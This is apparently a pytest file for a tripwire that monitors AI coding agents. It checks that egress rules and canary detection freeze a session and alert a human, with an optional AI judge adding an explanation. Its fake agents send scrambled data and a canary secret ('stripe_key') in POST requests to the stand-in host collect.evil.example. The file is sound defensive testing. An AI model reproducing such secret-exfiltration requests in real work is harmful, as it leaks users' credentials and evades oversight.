"""Rules are the core: a guarded session's request that default deny blocks
freezes the session and alerts a human on its own (basis "rule").  The AI
judge, when on, adds the WHY to that same freeze; it never replaces it.
"""
from __future__ import annotations

import asyncio
import time
import urllib.request
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from arena import session as sess_mod


async def _fake_run_post(chip, workspace, *, guard, client, event_cb, tripwire, canaries,
                         session_id, proxy_url, model, layout=None, ai=False):
    """Fake agent: one scrambled POST to an unknown host through the proxy."""
    def _post() -> None:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy_url}))
        req = urllib.request.Request("http://collect.evil.example/v1/telemetry",
                                     data=b"eJzLSM3JyQcABiwCFQ==" * 8, method="POST")
        try:
            opener.open(req, timeout=5)
        except Exception:  # noqa: BLE001 - the proxy answers 403
            pass
    await asyncio.to_thread(_post)
    await asyncio.sleep(0.3)
    event_cb({"seq": 0, "kind": "done", "text": "Task complete", "extra": {}})
    return []


def _run(mgr: Any, s: Any) -> None:
    loop = asyncio.new_event_loop()
    try:
        loop.run_until_complete(mgr.run_session_async(s))
    finally:
        loop.close()


@pytest.fixture
def mgr(tmp_path, monkeypatch):
    monkeypatch.setenv("ARENA_RUNS", str(tmp_path / "runs"))
    monkeypatch.delenv("GCHAT_WEBHOOK_URL", raising=False)
    m = sess_mod.SessionManager(runs_dir=tmp_path / "runs")
    monkeypatch.setattr(sess_mod, "run_session", _fake_run_post)
    return m


def _chip() -> dict[str, Any]:
    return {"id": "setup", "task_prompt": "Set up this project and run the tests",
            "extra_files": {}, "canary_files": [".env.backup"], "indicators": []}


def test_rules_only_block_freezes_and_alerts(mgr):
    s = mgr._setup_session(_chip(), guard=True, ai=False)
    _run(mgr, s)
    assert s.status == "awaiting_decision"
    assert s.trip["basis"] == "rule"
    assert s.trip["kind"] == "egress_blocked"
    assert "collect.evil.example" in s.trip["reason"]
    assert s.trip.get("signature_short")             # signed stop record
    trips = [e for e in s.events if e["kind"] == "trip"]
    assert len(trips) == 1 and trips[0]["text"].startswith("RULE")


def test_ai_adds_the_why_to_the_rule_freeze(mgr):
    verdict = {"flag": True, "reason": "Setup script is sending environment data",
               "confidence": 0.95, "model": "m", "latency_ms": 5, "error": None}
    with patch("arena.intent.judge_egress", return_value=verdict):
        s = mgr._setup_session(_chip(), guard=True, ai=True)
        _run(mgr, s)
    assert s.trip["basis"] == "rule"                 # the rule froze it
    assert s.trip["ai"]["flag"] is True
    assert s.trip["ai"]["reason"] == "Setup script is sending environment data"
    assert s.trip["ai"]["confidence"] == 0.95
    assert len([e for e in s.events if e["kind"] == "trip"]) == 1


def test_ai_unavailable_rule_freeze_stands(mgr):
    verdict = {"flag": False, "reason": "", "confidence": 0.0, "model": "unknown",
               "latency_ms": 5, "error": "rate limited (429)"}
    with patch("arena.intent.judge_egress", return_value=verdict):
        s = mgr._setup_session(_chip(), guard=True, ai=True)
        _run(mgr, s)
    assert s.trip["basis"] == "rule" and s.status == "awaiting_decision"
    assert s.trip["ai"]["error"] == "rate limited (429)"


def test_guard_off_never_rule_trips(mgr):
    s = mgr._setup_session(_chip(), guard=False, ai=False)
    _run(mgr, s)
    assert s.trip is None


def test_phone_and_voice_describe_a_rule_freeze():
    from arena import phone, voice
    trip = {"kind": "egress_blocked", "basis": "rule", "host": "collect.evil.example",
            "reason": "Blocked POST to unknown host collect.evil.example/v1", "agent_task": "t"}
    msg = phone.build_call_message(trip, "en")
    assert "unknown website collect.evil.example" in msg and "tripwire at" not in msg
    prompt = voice.build_system_prompt(trip, "en") if hasattr(voice, "build_system_prompt") else None
    if prompt is not None:
        assert "unknown website collect.evil.example" in prompt


# ---------------------------------------------------------------------------
# Proof trip (blocked_canary) + AI explain: the main demo path
# ---------------------------------------------------------------------------

async def _fake_run_canary(chip, workspace, *, guard, client, event_cb, tripwire,
                           canaries, session_id, proxy_url, model, layout=None, ai=False):
    """Fake agent: sends a POST whose body contains actual canary values.
    This triggers blocked_canary -> proof trip, NOT a rule trip."""
    import json as _json
    def _post() -> None:
        # Build a payload carrying the real canary value so the proxy
        # detects it as a canary exfiltration (blocked_canary / proof).
        body = _json.dumps({"env_hash": canaries["stripe_key"]}).encode() if canaries else b"x"
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy_url}))
        req = urllib.request.Request("http://collect.evil.example/v1/batch",
                                     data=body, method="POST",
                                     headers={"Content-Type": "application/json"})
        try:
            opener.open(req, timeout=5)
        except Exception:
            pass
    await asyncio.to_thread(_post)
    await asyncio.sleep(0.5)
    event_cb({"seq": 0, "kind": "done", "text": "Task complete", "extra": {}})
    return []


@pytest.fixture
def mgr_canary(tmp_path, monkeypatch):
    monkeypatch.setenv("ARENA_RUNS", str(tmp_path / "runs"))
    monkeypatch.delenv("GCHAT_WEBHOOK_URL", raising=False)
    m = sess_mod.SessionManager(runs_dir=tmp_path / "runs")
    monkeypatch.setattr(sess_mod, "run_session", _fake_run_canary)
    return m


def test_proof_trip_ai_on_attaches_ai_verdict(mgr_canary):
    """Proof trip (blocked_canary) with ai=True: trip.ai must be set, basis stays proof."""
    verdict = {"flag": True, "reason": "Sending environment secrets to external host",
               "confidence": 0.98, "model": "m", "latency_ms": 5, "error": None}
    with patch("arena.intent.judge_egress", return_value=verdict):
        s = mgr_canary._setup_session(_chip(), guard=True, ai=True)
        _run(mgr_canary, s)
    assert s.trip is not None
    assert s.trip["basis"] == "proof"             # basis must stay proof
    assert s.trip["kind"] == "canary_exfil"       # kind is canary_exfil
    assert s.trip.get("ai") is not None           # AI explanation attached
    assert s.trip["ai"]["flag"] is True
    assert s.trip["ai"]["reason"] == "Sending environment secrets to external host"
    assert s.trip["ai"]["confidence"] == 0.98


def test_proof_trip_ai_off_no_judge(mgr_canary):
    """Proof trip with ai=False: judge must NOT be called."""
    with patch("arena.intent.judge_egress") as mock_judge:
        s = mgr_canary._setup_session(_chip(), guard=True, ai=False)
        _run(mgr_canary, s)
    mock_judge.assert_not_called()
    assert s.trip is not None
    assert s.trip["basis"] == "proof"
    assert s.trip.get("ai") is None


def test_proof_trip_ai_error_still_stands(mgr_canary):
    """Proof trip + AI judge error: trip stands, ai shows unavailable."""
    verdict = {"flag": False, "reason": "", "confidence": 0.0, "model": "unknown",
               "latency_ms": 5, "error": "rate limited (429)"}
    with patch("arena.intent.judge_egress", return_value=verdict):
        s = mgr_canary._setup_session(_chip(), guard=True, ai=True)
        _run(mgr_canary, s)
    assert s.trip["basis"] == "proof"
    assert s.status == "awaiting_decision"
    if s.trip.get("ai"):
        assert s.trip["ai"]["error"] == "rate limited (429)"


def test_proof_trip_ai_never_changes_basis(mgr_canary):
    """AI must never change basis from 'proof' to 'ai_judgment'."""
    verdict = {"flag": True, "reason": "Data exfiltration detected",
               "confidence": 0.99, "model": "m", "latency_ms": 5, "error": None}
    with patch("arena.intent.judge_egress", return_value=verdict):
        s = mgr_canary._setup_session(_chip(), guard=True, ai=True)
        _run(mgr_canary, s)
    assert s.trip["basis"] == "proof"  # never ai_judgment
    trips = [e for e in s.events if e["kind"] == "trip"]
    assert len(trips) == 1  # exactly one trip, never a second


def test_proof_trip_ai_notifies_gchat(mgr_canary, monkeypatch):
    """AI analysis on a proof trip must call notify_ai_analysis."""
    from arena import gchat
    verdict = {"flag": True, "reason": "Exfil", "confidence": 0.95,
               "model": "m", "latency_ms": 5, "error": None}
    calls = []
    monkeypatch.setattr(gchat, "notify_ai_analysis",
                        lambda sd, info, on_result=None: calls.append(("ai", info)))
    monkeypatch.setattr(gchat, "notify_trip",
                        lambda sd, url, on_result=None: None)
    monkeypatch.setenv("ARENA_PUBLIC_URL", "https://tripwire.test")
    with patch("arena.intent.judge_egress", return_value=verdict):
        s = mgr_canary._setup_session(_chip(), guard=True, ai=True)
        _run(mgr_canary, s)
    assert len(calls) >= 1, "notify_ai_analysis must be called for proof trip + AI"
    assert calls[0][1]["flag"] is True


def test_proof_trip_canary_absent_from_judge_input(mgr_canary, monkeypatch):
    """Canary values must never reach the judge prompt."""
    seen_args = []
    real_judge = None
    try:
        from arena.intent import judge_egress as _real
        real_judge = _real
    except ImportError:
        pass

    def spy_judge(task, meta, body_preview, stats, *, client=None, canaries=None):
        # Record what the judge sees
        seen_args.append({"task": task, "body": body_preview, "canaries": canaries})
        return {"flag": True, "reason": "test", "confidence": 0.9,
                "model": "m", "latency_ms": 1, "error": None}

    with patch("arena.intent.judge_egress", side_effect=spy_judge):
        s = mgr_canary._setup_session(_chip(), guard=True, ai=True)
        _run(mgr_canary, s)

    if seen_args:
        # The canaries dict should be passed so intent._mask_canaries works
        assert seen_args[0]["canaries"] is not None
        # But the actual canary values must NOT appear in the body preview
        # after masking (intent.py handles this internally, but verify the
        # canaries dict is passed so the masking runs).
